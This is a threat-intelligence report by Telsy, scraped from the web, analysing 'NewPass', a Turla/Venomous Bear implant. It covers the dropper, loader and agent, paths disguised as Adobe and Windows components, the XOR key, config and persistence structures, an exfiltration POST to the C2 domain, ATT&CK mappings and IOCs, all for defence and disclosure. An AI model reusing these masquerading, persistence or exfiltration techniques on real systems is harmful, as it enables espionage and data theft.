# Reference for threat actor for "Turla, Waterbug, Venomous Bear"

**Title**: Turla / Venomous Bear updates its arsenal: "NewPass" appears on the APT threat scene - Telsy

**Source**: https://www.telsy.com/turla-venomous-bear-updates-its-arsenal-newpass-appears-on-the-apt-threat-scene/

## Content
























Turla / Venomous Bear updates its arsenal: "NewPass" appears on the APT threat scene - Telsy





















































        Gruppo TIM
      

















Close











About Us
Solutions

Go to Solutions
Cyber
Crypto
Quantum


Innovation
Markets
Careers
Blog



									Featured News						






05 Feb
Security for offline conversations: TelsyATMO









18 Dec
The Made-in-Italy Secure Microchip






 






Security for offline conversations: TelsyATMO








The Made-in-Italy Secure Microchip




											View all										



English
Italiano

 













CYBER THREAT INTELLIGENCE 
Turla / Venomous Bear updates its arsenal: “NewPass” appears on the APT threat scene 
						14 Jul					



Share































 
Recently Telsy observed some artifacts related to an attack that occurred in June 2020 that is most likely linked to the popular Russian Advanced Persistent Threat (APT) known as Venomous Bear (aka Turla or Uroburos). At the best of our knowledge, this time the hacking group used a previously unseen implant, that we internally named “NewPass“ as one of the parameters used to send exfiltrated data to the command and control.
Telsy suspects this implant has been used to target at least one European Union country in the sector of diplomacy and foreign affairs.
NewPass is quite a complex malware composed by different components that rely on an encoded file to pass information and configuration between each other. There are at least three components of the malware: a dropper, that deploys the binary file; a loader library, that is able to decode the binary file extracting the last component, responsible for performing specific operations, such as communicate with the attackers’ command and control server (the “agent”)
The loader and the agent share a JSON configuration resident in memory that demonstrate the potential of the malware and the ease with which the attackers can customize the implant by simply changing the configuration entries’ values.
 
Dropper Analysis 
The first Windows library has a huge size, about 2.6 MB, and it is identified by the following hash:
 




Type
Value


SHA256
e1741e02d9387542cc809f747c78d5a352e7682a9b83cbe210c09e2241af6078




 
Exploring the artifact using a static approach, it is possible to note that it exports a high number of functions, as shown in the following image.
 

 
Most of the reported functions point to useless code and only LocalDataVer can be used as an entry point of the DLL, therefore making it useful to understand the malicious behavior.
Attackers used this trick likely to avoid sandbox analysis, as well as make manual analysis slightly harder. Sandbox solutions, in fact, probably will try to execute a DLL file using rundll32.exe or regsvr32.exe utilities, using “DllMain” or “DllRegisterServer” as an entrypoint function. In this case, both these functions cause the termination of the program, without showing the real malware behavior.
The library’s aim is to deploy the backdoor and its configuration file under two different folders depending on attacker’s customization.
According to what has been observed by our research team, the paths used in this case are the following:
 




Configuration Path
Backdoor Path


ProgramData\Adobe\ARM\Reader_20.021.210_47.dat
C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\lib3DXquery.dll


ProgramData\WindowsHolographic\SpatialStore\HolographicSpatialStore.swid
WindowsHolographicService.dll




 
For the second sample we weren’t able to retrieve its dropper. Therefore, it is possible to obtain the location of the configuration file from which the backdoor tried to load the parameters, but not the exact location in which the dropper deployed the implant artifact.
Furthermore, the used paths are very stealthy and it is easy to confuse the artifacts as components of legitimate programs, such as Adobe Reader or Windows Mixed Reality.
In particular, the path of the first sample is the same used by the legitimate Adobe Reader installation and therefore the lib3DXquery.dll file matches up perfectly with the other Adobe components, making it almost totally invisible.
The configuration file written, at first glance, seems to be totally encrypted and incomprehensible without analyzing the next stage. The following image shows the configuration file in its raw form.
 

 
Loader Analysis 
The retrieved backdoor implants are identified by the following hashes:
 




Name
SHA256


lib3DXquery.dll
6e730ea7b38ea80f2e852781f0a96e0bb16ebed8793a5ea4902e94c594bb6ae0


WindowsHolographicService.dll
f966ef66d0510da597fec917451c891480a785097b167c6a7ea130cf1e8ff514




 
Once again, the libraries export several functions but only one is useful to execute their real payload.
 

 
To begin, the library checks the presence of the associated configuration file, if it does not exist, the backdoor terminates its execution. Vice versa, once found the file the malware starts to decode and read the current configuration.
The first 5 bytes of the file contains the size of the data to read starting from the 6th bytes and which contains the first encoded information useful to allow the malware to load the entire configuration.
All the data retrieved in this first phase is encoded using a simple XOR algorithm with a fixed key 19 B9 20 5A B8 EF 2D A3 73 08 C1 53, hardcoded at the beginning of the function as represented in the following image.
 

 
So, the malware reads the first 5 bytes and decodes it using the key, obtaining the number of the bytes it has to read to obtain the initial configuration.
In this specific case, from the decoded bytes it gets the value 00081.
So, it proceeds to read other next 81 bytes.
 

 
Decoding these last ones with the usual key, it obtains a string composed by different parameters separated by “||”, as illustrated below.
 

 
However, this is still not the final configuration used by the malware, but it contains only the parameters to load the last malicious Windows library, named LastJournalx32.adf, containing the final agent.
This payload is hidden into the configuration file after a section of random bytes used by the attackers to change the hash value of the file at every infection.
 

 
During its activity, the loader decrypts and maintains in memory the complete configuration used during the infection chain.
It consists of different JSON formatted structures that look like the following:
 




{    “RefreshToken”:””,    “NoInternetSleepTime”:”3600″,    “GetMaxSize”:”60000″,    “ClientId”:””,    “DropperExportFunctionName”:”LocalDataVer”,    “Autorun”:”16″,    “ImgurImageDeletionTime”:”120″,    “RecoveryServers”:[      ],    “RunDllPath”:”%WinDir%\\System32″,    “AgentLoaderExportFunctionName”:”LocalDataVer”,    “Key”:”[…redacted…]”,    “AgentName”:”LastJournalx32.adf”,    “UserAgent”:””,    […truncated…]




 
The structure contains all the information necessary for the loader to correctly launch the final agent. Some of these information are AgentFileSystemName, AgentExportName and AgentName.
The agent shares the same memory space of the loader, thus it is able to access to the same configuration and to extract the needed parameters, such as the object named Credentials. It also contains the domain name (newshealthsport[.]com) and the path (/sport/latest.php) of the command-and-control with which the agent will communicate.
From the configuration it is also possible to notice the version number of the malware, specifically it is 19.03.28 for the AgentLoader and 19.7.16 for the Agent.
Moreover, the agent is identified by an ID addressed by the AgentID entry that is used during the communication with the C2 as identifier of the infected machine.
The configuration also embeds a specific structure for persistence mechanisms that appears as follow:
 




{     “Autoruns”: {         “Service”: {             “DisplayName”: “Adobe Update Module”,              “ServiceName”: “Adobe Update Module”,              “Enabled”: “true”         },          “TaskScheduler”: {             “Enabled”: “false”         },          “Registry”: {             “Enabled”: “false”         },          “Policies”: {             “Enabled”: “false”         }     } }




 
The implant supports different types of persistence mechanisms: through Service Manager, Task Scheduler, via Registry Key or using Windows GPO. 
In this specific case, attackers enabled the Service method that allows the malware to interact with the SCManager to create a new service named Adobe Update Module pointing to the path of the loader.
 
Agent Analysis
The last payload is identified by the following hash:
 




Type
Value


SHA256
08a1c5b9b558fb8e8201b5d3b998d888dd6df37dbf450ce0284d510a7104ad7f




 
It is responsible for exfiltrating information from the infected machine, sending it to the command-and-control and downloading new commands to be executed.
To make the communication with the C2 stealthier, the agent uses a set of keywords to separate the data within a POST request. The keywords are specified by attackers during development phase.
In the analyzed case, they are the following:

dbnew
contentname
newpass
passdb
data_src
server_login
table_data
token_name
server_page
targetlogin

So, during the exfiltration phase, the HTTP requests appear as reported in the table below
 




POST /sport/latest.php HTTP/1.1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko Host: newshealthsport. com Content-Length: 170 Connection: Keep-Alive   newpass=[redacted]&server_page=[redacted]&passdb=[redacted]&targetlogin=t&table_data=[redacted]  




 
All the values embedded into the request are encrypted, probably using one of the keys embedded into the previous configuration. The algorithm used during the encryption phase is most probably a custom one.
Below, we report a simple scheme of the described infection chain, highlighting the three components of this new threat: the dropper, the loader and the agent.
 

 
Persistence
As mentioned above, the malware is able to create services or tasks or to add registry keys to achieve persistence. In the analyzed case, the loader component is set to create a new Windows service, specifying its path location as ImagePath.
 
ATT&CK Matrix
 




Technique
Tactic
Description


T1204
Execution
Threat actor relies upon specific actions by a user in order to gain execution


T1060
Persistence
Threat actor adds an entry to the “run keys” in the Registry or startup folder to allow the program will be executed when a user logs in


T1053
Persistence
Threat actor uses Windows Task Scheduler to schedule programs or scripts to be executed at a date and time


T1543
Persistence
Adversaries create or modify Windows services to repeatedly execute malicious payloads as part of persistence


T1073
Defense Evasion
Programs specifies DLLs that are loaded at runtime


T1132
Command and control
Command and control (C2) information is encoded using a standard data encoding system


T1001
Command and Control
Command and control (C2) communications are hidden in an attempt to make the content more difficult to discover or decipher


T1041
Exfiltration
Threat actor relies on command and control infrastructure to exfiltrate data




 
Indicators of Compromise
 




Type
Value


SHA256
e1741e02d9387542cc809f747c78d5a352e7682a9b83cbe210c09e2241af6078


SHA256
6e730ea7b38ea80f2e852781f0a96e0bb16ebed8793a5ea4902e94c594bb6ae0


SHA256
08a1c5b9b558fb8e8201b5d3b998d888dd6df37dbf450ce0284d510a7104ad7f


SHA256
f966ef66d0510da597fec917451c891480a785097b167c6a7ea130cf1e8ff514


Domain
newshealthsport. com


URL
http://newshealthsport. com/sport/latest.php




 
Check other cyber reports on our site.





 





 



Post navigation
Previous: Ransomware: a threat to the present and the futureNext: Twitter attack: the three lessons to learn
 






Find out moreAbout us
Solutions
Careers
Blog
Governance
Privacy Policy
 Comment Policy
 Whistleblowingtim grouplogo zero 



Operational Offices Turin
Corso Svizzera, 185, 10149
Rome
Via Bartolomeo Marliano, 27, 00162
Via Antonio Nibby, 4-6, 00161
Naples
Centro Direzionale, Isola F7, 80143

Commercial Office Milan
Via Gaetano Negri, 1, 20123

 



Contacts Phone
+39 011 77 14 343
Mail
contact@telsy.it

Follow us




 







										© 2020 Telsy SpA company with a single shareholder TIM Group • VAT 00737690016 • REA TO443365									








































